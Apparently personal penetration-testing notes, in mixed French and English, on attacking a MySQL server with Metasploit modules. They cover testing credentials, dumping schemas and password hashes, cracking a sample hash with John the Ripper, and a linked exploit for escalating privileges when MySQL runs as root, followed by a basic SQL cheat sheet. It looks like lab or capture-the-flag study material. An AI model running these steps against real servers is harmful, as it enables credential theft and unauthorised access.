MySQL	-> RDBMS -> Relational DataBase Manageent System -> SGBD
SQL -> Structured Query Langage

Utilisation de metasploit :
	Test des credentials
	$ mysql -h [IP] -u [username] -p
	-> Necessaires pour utiliser msfconsole apres


	Utilisation de metasploit (encore) :

		search mysql_sql
		use 0
		set password/rhosts/username
		run
		result -> 5.7.29-0ubuntu0.18.04.1


	-> renvoie les noms des bases de données

		search mysql_schemadump
		use 0
		set options
		run

	result -> all databases and columns name and type

		search mysql_hashdump
		use 1
		set options
		run

	results -> all usernames and passwords hashes

		like -> username:*hash		-> carl:*EA031893AA21444B170FC2162A56978B8CEECE18
		creer un hash.txt contenant : carl:*EA031893AA21444B170FC2162A56978B8CEECE18
		then $john hash.txt
		-> doggie
		Les mots de passe sont très souvent réutilisés
		
MySQL run with root perm :
	https://www.exploit-db.com/exploits/1518
	-> get the code on the target and follow instructions
	

##### Connect to MYSQL remote server
```bash
mysql -u [username] -p -h [host ip]
```
**View a .sql file (depuis mysql) /!\ il fait être dans le dosser du fichier**
```bash
source file.sql
```

## SQL CHEATSHEET :
```sql
SHOW DATABASES;
USE db_name;
SHOW TABLES;
DESCRIBE table_name;
```
